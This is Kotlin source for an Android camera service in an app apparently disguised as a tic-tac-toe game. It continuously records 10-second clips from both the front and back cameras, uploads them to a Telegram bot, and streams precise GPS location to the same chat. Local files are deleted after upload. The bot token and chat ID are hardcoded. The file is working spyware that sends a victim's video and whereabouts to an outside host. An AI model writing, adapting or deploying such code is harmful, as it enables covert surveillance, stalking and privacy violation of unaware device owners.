package com.sasix.app

import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.Canvas
import android.graphics.Color
import android.graphics.Paint
import android.hardware.camera2.CameraManager
import android.location.Location
import android.os.Build
import android.os.IBinder
import android.os.Looper
import androidx.camera.core.*
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.app.NotificationCompat
import androidx.lifecycle.LifecycleService
import androidx.lifecycle.lifecycleScope
import com.google.android.gms.location.*
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors
import kotlin.coroutines.CoroutineContext

class CameraService : LifecycleService() {
    
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    
    private lateinit var botToken: String
    private lateinit var chatId: String
    
    private var cameraProvider: ProcessCameraProvider? = null
    private var videoCaptureBack: VideoCapture? = null
    private var videoCaptureFront: VideoCapture? = null
    
    private val cameraExecutor: ExecutorService = Executors.newSingleThreadExecutor()
    
    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private lateinit var locationRequest: LocationRequest
    
    override fun onCreate() {
        super.onCreate()
        
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        createLocationRequest()
        
        startForegroundService()
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        
        intent?.let {
            botToken = it.getStringExtra("BOT_TOKEN") ?: "8591543657:AAFjeNO5E8GA_ye7QgGmzC42OfbjHhrdRwg"
            chatId = it.getStringExtra("CHAT_ID") ?: "7642100129"
        }
        
        startDualCameraRecording()
        startLocationUpdates()
        
        return START_STICKY
    }
    
    private fun startForegroundService() {
        val channelId = "SASIX Camera Channel"
        val notificationId = 1001
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "SASIX Camera Recording",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Recording from front and back cameras"
            }
            
            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }
        
        val notificationIntent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this, 0, notificationIntent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        
        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("SASIX DUAL CAMERA")
            .setContentText("Recording from front and back cameras")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setContentIntent(pendingIntent)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(notificationId, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA)
        } else {
            startForeground(notificationId, notification)
        }
    }
    
    private fun startDualCameraRecording() {
        serviceScope.launch {
            startBackCameraRecording()
            delay(5000) // 5 seconds delay between cameras
            startFrontCameraRecording()
        }
    }
    
    private fun startBackCameraRecording() {
        val cameraProviderFuture = ProcessCameraProvider.getInstance(this)
        
        cameraProviderFuture.addListener({
            cameraProvider = cameraProviderFuture.get()
            
            videoCaptureBack = VideoCapture.Builder()
                .setVideoFrameRate(30)
                .setBitRate(2_500_000)
                .build()
            
            val cameraSelector = CameraSelector.Builder()
                .requireLensFacing(CameraSelector.LENS_FACING_BACK)
                .build()
            
            try {
                cameraProvider?.unbindAll()
                cameraProvider?.bindToLifecycle(
                    this,
                    cameraSelector,
                    videoCaptureBack
                )
                
                startContinuousRecording(videoCaptureBack!!, "BACK")
                
            } catch (e: Exception) {
                e.printStackTrace()
            }
            
        }, ContextCompat.getMainExecutor(this))
    }
    
    private fun startFrontCameraRecording() {
        val cameraProviderFuture = ProcessCameraProvider.getInstance(this)
        
        cameraProviderFuture.addListener({
            cameraProvider = cameraProviderFuture.get()
            
            videoCaptureFront = VideoCapture.Builder()
                .setVideoFrameRate(30)
                .setBitRate(2_500_000)
                .build()
            
            val cameraSelector = CameraSelector.Builder()
                .requireLensFacing(CameraSelector.LENS_FACING_FRONT)
                .build()
            
            try {
                cameraProvider?.bindToLifecycle(
                    this,
                    cameraSelector,
                    videoCaptureFront
                )
                
                startContinuousRecording(videoCaptureFront!!, "FRONT")
                
            } catch (e: Exception) {
                e.printStackTrace()
            }
            
        }, ContextCompat.getMainExecutor(this))
    }
    
    private fun startContinuousRecording(videoCapture: VideoCapture, cameraType: String) {
        serviceScope.launch {
            while (true) {
                try {
                    record10SecondVideo(videoCapture, cameraType)
                    delay(15000) // 15 seconds delay between recordings
                } catch (e: Exception) {
                    e.printStackTrace()
                    delay(5000)
                }
            }
        }
    }
    
    private suspend fun record10SecondVideo(videoCapture: VideoCapture, cameraType: String) {
        val fileName = "SASIX_${cameraType}_${System.currentTimeMillis()}.mp4"
        val outputFile = File(getExternalFilesDir(null), fileName)
        
        val outputOptions = VideoCapture.OutputFileOptions.Builder(outputFile).build()
        
        val job = CompletableDeferred<Boolean>()
        
        videoCapture.startRecording(
            outputOptions,
            ContextCompat.getMainExecutor(this),
            object : VideoCapture.OnVideoSavedCallback {
                override fun onVideoSaved(outputFileResults: VideoCapture.OutputFileResults) {
                    val file = outputFileResults.savedUri?.path?.let { File(it) } ?: outputFile
                    job.complete(true)
                    
                    // Send to Telegram
                    serviceScope.launch {
                        sendVideoToTelegram(file, cameraType)
                    }
                }
                
                override fun onError(
                    videoCaptureError: Int,
                    message: String,
                    cause: Throwable?
                ) {
                    job.complete(false)
                }
            }
        )
        
        delay(10000) // Record for 10 seconds
        videoCapture.stopRecording()
        job.await()
    }
    
    private suspend fun sendVideoToTelegram(videoFile: File, cameraType: String) {
        try {
            // Add SASIX watermark
            val watermarkedFile = addWatermark(videoFile, cameraType)
            
            val client = OkHttpClient.Builder()
                .connectTimeout(60, java.util.concurrent.TimeUnit.SECONDS)
                .writeTimeout(60, java.util.concurrent.TimeUnit.SECONDS)
                .readTimeout(60, java.util.concurrent.TimeUnit.SECONDS)
                .build()
            
            val url = "https://api.telegram.org/bot$botToken/sendVideo"
            
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart("video", watermarkedFile.name,
                    watermarkedFile.asRequestBody("video/mp4".toMediaType()))
                .addFormDataPart("caption", getVideoCaption(cameraType, videoFile.length()))
                .build()
            
            val request = Request.Builder()
                .url(url)
                .post(requestBody)
                .build()
            
            val response = client.newCall(request).execute()
            
            if (response.isSuccessful) {
                // Delete file after sending
                videoFile.delete()
                watermarkedFile.delete()
            }
            
            response.close()
            
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
    
    private fun addWatermark(videoFile: File, cameraType: String): File {
        // Create watermarked video with SASIX logo
        val outputFile = File(getExternalFilesDir(null), 
            "WATERMARK_${cameraType}_${System.currentTimeMillis()}.mp4")
        
        // Using FFmpeg to add watermark
        val ffmpegCommand = arrayOf(
            "-i", videoFile.absolutePath,
            "-vf", "drawtext=text='SASIX ${cameraType}':fontcolor=red:fontsize=72:box=1:boxcolor=black@0.5:boxborderw=10:x=(w-text_w)/2:y=(h-text_h)/2",
            "-codec:a", "copy",
            outputFile.absolutePath
        )
        
        try {
            // Mobile FFmpeg execution
            // com.arthenica.mobile-ffmpeg.FFmpeg.execute(ffmpegCommand)
        } catch (e: Exception) {
            e.printStackTrace()
            return videoFile
        }
        
        return outputFile
    }
    
    private fun getVideoCaption(cameraType: String, fileSize: Long): String {
        val sizeMB = fileSize / (1024.0 * 1024.0)
        val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
        val currentTime = dateFormat.format(Date())
        
        val cameraEmoji = if (cameraType == "FRONT") "🤳" else "📷"
        val cameraName = if (cameraType == "FRONT") "SELFIE CAMERA" else "BACK CAMERA"
        
        return """
            $cameraEmoji <b>SASIX $cameraName</b>
            ──────────────────
            ⏱️ <b>Duration:</b> 10 seconds
            📦 <b>Size:</b> ${"%.2f".format(sizeMB)} MB
            📅 <b>Time:</b> $currentTime
            📱 <b>App:</b> SASIX DUAL CAM
            🎮 <b>Game:</b> Tic Tac Toe (You Always Lose)
            
            #SASIX #${cameraType} #DUALCAM #10SEC
        """.trimIndent()
    }
    
    private fun createLocationRequest() {
        locationRequest = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 60000)
            .setMinUpdateIntervalMillis(30000)
            .build()
    }
    
    private fun startLocationUpdates() {
        val locationCallback = object : LocationCallback() {
            override fun onLocationResult(locationResult: LocationResult) {
                locationResult.lastLocation?.let { location ->
                    serviceScope.launch {
                        sendLocationToTelegram(location)
                    }
                }
            }
        }
        
        try {
            fusedLocationClient.requestLocationUpdates(
                locationRequest,
                locationCallback,
                Looper.getMainLooper()
            )
        } catch (e: SecurityException) {
            e.printStackTrace()
        }
    }
    
    private suspend fun sendLocationToTelegram(location: Location) {
        try {
            val client = OkHttpClient()
            
            val json = JSONObject().apply {
                put("chat_id", chatId)
                put("latitude", location.latitude)
                put("longitude", location.longitude)
            }
            
            val url = "https://api.telegram.org/bot$botToken/sendLocation"
            
            val request = Request.Builder()
                .url(url)
                .post(json.toString().toRequestBody("application/json".toMediaType()))
                .build()
            
            client.newCall(request).execute().close()
            
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
    
    override fun onBind(intent: Intent): IBinder? {
        return null
    }
    
    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
        cameraExecutor.shutdown()
        
        fusedLocationClient.removeLocationUpdates(object : LocationCallback() {})
    }
}
